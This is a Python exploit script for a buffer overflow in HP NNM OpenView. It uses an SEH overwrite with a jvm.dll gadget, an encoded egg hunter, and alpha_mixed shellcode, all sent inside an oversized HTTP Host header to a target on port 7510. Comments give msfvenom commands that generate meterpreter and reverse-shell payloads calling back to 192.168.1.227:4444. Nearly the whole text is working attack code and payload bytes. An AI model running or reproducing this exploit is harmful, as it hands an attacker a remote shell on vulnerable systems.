# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in HP NNM OpenView. Though it's an old vulnerability and many exploits exist for it, I created this from scratch.

# 0x6d371b43 : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\HP OpenView\jre\jre1.4\bin\client\jvm.dll)
# Short Jump: \x74\x06\x48\x48
# Egg Hunter code: "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# Command to encode egg hunter code: msfvenom -p generic/custom PAYLOADFILE=egg.bin -e x86/alpha_mixed BufferRegister=EAX -f python
# Shellcode Command - msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.227 LPORT=4444 -e x86/alpha_mixed BufferRegister=EDI -f python
# Shellcode 2 Command - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.227 LPORT=4444 -e x86/alpha_mixed BufferRegister=EDI -f python


# Flow of Events
# 1. Hit POP POP RETN
# 2. Do a short jump over SEH 
#
# 	 00C0FFDC   74 06            JE SHORT 00C0FFE4
#
# 3. Align EAX for Egg Hunter code - alpha_mixed encoded | BufferRegister=EAX
#
#	 1044FE3C   58               POP EAX                                  ; 1044FE34
#	 1044FE3D   04 12            ADD AL,12
#
# 4. Run Egg Hunter Code
# 5. Find EGGEGG + Shellcode (alpha_mixed encoded | BufferRegister=EDI)
# 6. Run Shellcode


import sys
import socket


egg =  ""
egg += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egg += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
egg += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
egg += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
egg += "\x51\x76\x4e\x61\x58\x4a\x69\x6f\x56\x6f\x53\x72\x50"
egg += "\x52\x63\x5a\x64\x42\x70\x58\x68\x4d\x64\x6e\x35\x6c"
egg += "\x45\x55\x63\x6a\x43\x44\x6a\x4f\x78\x38\x61\x49\x43"
egg += "\x73\x72\x73\x30\x43\x4e\x6b\x58\x7a\x6c\x6f\x31\x65"
egg += "\x68\x6a\x4c\x6f\x52\x55\x59\x77\x39\x6f\x69\x77\x41"
egg += "\x41"

buf =  "YCSCYCSC"
buf += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x39\x6c\x39\x78\x4f\x72\x45\x50\x67\x70\x63\x30\x43"
buf += "\x50\x4b\x39\x5a\x45\x35\x61\x4b\x70\x70\x64\x6e\x6b"
buf += "\x56\x30\x36\x50\x4e\x6b\x62\x72\x56\x6c\x6c\x4b\x66"
buf += "\x32\x36\x74\x6c\x4b\x42\x52\x31\x38\x34\x4f\x38\x37"
buf += "\x61\x5a\x31\x36\x74\x71\x79\x6f\x4c\x6c\x35\x6c\x71"
buf += "\x71\x31\x6c\x65\x52\x56\x4c\x37\x50\x6f\x31\x68\x4f"
buf += "\x56\x6d\x33\x31\x48\x47\x38\x62\x6b\x42\x70\x52\x52"
buf += "\x77\x6c\x4b\x71\x42\x54\x50\x6e\x6b\x31\x5a\x35\x6c"
buf += "\x6e\x6b\x32\x6c\x46\x71\x50\x78\x6b\x53\x53\x78\x73"
buf += "\x31\x6e\x31\x62\x71\x6e\x6b\x51\x49\x55\x70\x46\x61"
buf += "\x39\x43\x6e\x6b\x63\x79\x35\x48\x38\x63\x65\x6a\x67"
buf += "\x39\x4e\x6b\x64\x74\x4c\x4b\x35\x51\x48\x56\x44\x71"
buf += "\x69\x6f\x6c\x6c\x4b\x71\x38\x4f\x64\x4d\x63\x31\x6a"
buf += "\x67\x35\x68\x49\x70\x70\x75\x7a\x56\x37\x73\x43\x4d"
buf += "\x7a\x58\x37\x4b\x43\x4d\x37\x54\x53\x45\x58\x64\x53"
buf += "\x68\x4e\x6b\x30\x58\x37\x54\x35\x51\x79\x43\x70\x66"
buf += "\x6c\x4b\x66\x6c\x62\x6b\x4e\x6b\x33\x68\x77\x6c\x77"
buf += "\x71\x58\x53\x6e\x6b\x47\x74\x6e\x6b\x57\x71\x6e\x30"
buf += "\x4c\x49\x62\x64\x64\x64\x56\x44\x53\x6b\x43\x6b\x53"
buf += "\x51\x30\x59\x32\x7a\x42\x71\x59\x6f\x59\x70\x63\x6f"
buf += "\x61\x4f\x63\x6a\x4e\x6b\x76\x72\x68\x6b\x6c\x4d\x53"
buf += "\x6d\x51\x78\x70\x33\x74\x72\x53\x30\x75\x50\x73\x58"
buf += "\x44\x37\x54\x33\x44\x72\x51\x4f\x72\x74\x55\x38\x52"
buf += "\x6c\x51\x67\x61\x36\x47\x77\x4b\x39\x59\x78\x49\x6f"
buf += "\x68\x50\x4d\x68\x6a\x30\x43\x31\x45\x50\x43\x30\x46"
buf += "\x49\x6a\x64\x51\x44\x62\x70\x75\x38\x76\x49\x6d\x50"
buf += "\x70\x6b\x53\x30\x39\x6f\x4b\x65\x73\x5a\x46\x6a\x51"
buf += "\x78\x49\x50\x79\x38\x73\x31\x6b\x53\x31\x78\x34\x42"
buf += "\x33\x30\x37\x61\x31\x4c\x4b\x39\x4a\x46\x42\x70\x42"
buf += "\x70\x72\x70\x76\x30\x77\x30\x72\x70\x77\x30\x50\x50"
buf += "\x61\x78\x38\x6a\x46\x6f\x79\x4f\x6b\x50\x49\x6f\x78"
buf += "\x55\x6a\x37\x70\x6a\x44\x50\x52\x76\x66\x37\x42\x48"
buf += "\x4c\x59\x6e\x45\x61\x64\x73\x51\x49\x6f\x5a\x75\x6b"
buf += "\x35\x59\x50\x61\x64\x76\x6a\x6b\x4f\x72\x6e\x53\x38"
buf += "\x70\x75\x4a\x4c\x6a\x48\x30\x67\x35\x50\x35\x50\x35"
buf += "\x50\x51\x7a\x67\x70\x30\x6a\x44\x44\x42\x76\x43\x67"
buf += "\x73\x58\x55\x52\x69\x49\x6f\x38\x51\x4f\x4b\x4f\x59"
buf += "\x45\x4d\x53\x5a\x58\x43\x30\x51\x6e\x57\x46\x4c\x4b"
buf += "\x75\x66\x53\x5a\x43\x70\x73\x58\x63\x30\x76\x70\x67"
buf += "\x70\x35\x50\x32\x76\x73\x5a\x43\x30\x55\x38\x62\x78"
buf += "\x4e\x44\x76\x33\x78\x65\x59\x6f\x59\x45\x7a\x33\x66"
buf += "\x33\x52\x4a\x65\x50\x31\x46\x73\x63\x30\x57\x65\x38"
buf += "\x37\x72\x49\x49\x39\x58\x33\x6f\x49\x6f\x6b\x65\x6b"
buf += "\x33\x49\x68\x57\x70\x31\x6d\x55\x78\x61\x48\x32\x48"
buf += "\x37\x70\x61\x50\x33\x30\x77\x70\x43\x5a\x53\x30\x56"
buf += "\x30\x31\x78\x66\x6b\x56\x4f\x76\x6f\x54\x70\x59\x6f"
buf += "\x79\x45\x71\x47\x53\x58\x50\x75\x70\x6e\x62\x6d\x73"
buf += "\x51\x69\x6f\x6a\x75\x73\x6e\x51\x4e\x59\x6f\x34\x4c"
buf += "\x45\x74\x54\x4f\x6d\x55\x64\x30\x69\x6f\x4b\x4f\x59"
buf += "\x6f\x4a\x49\x4f\x6b\x59\x6f\x39\x6f\x69\x6f\x47\x71"
buf += "\x6a\x63\x61\x39\x48\x46\x44\x35\x6a\x61\x39\x53\x4f"
buf += "\x4b\x78\x70\x6f\x45\x6c\x62\x61\x46\x31\x7a\x67\x70"
buf += "\x32\x73\x49\x6f\x6a\x75\x41\x41"




buf2 = "A" * 2333 + buf  + "F"*300 + "\x74\x06\x48\x48" + "\x43\x1b\x37\x6d" + "\x58\x04\x12" +"C"*7 + egg + "D" * 582

evilString = "GET /topology/home HTTP/1.1\r\n"
evilString += "Host: "+buf2 +"\r\n"
evilString += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n\r\n"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect (('192.168.1.228',7510))

print evilString	
s.send(evilString)
s.close()
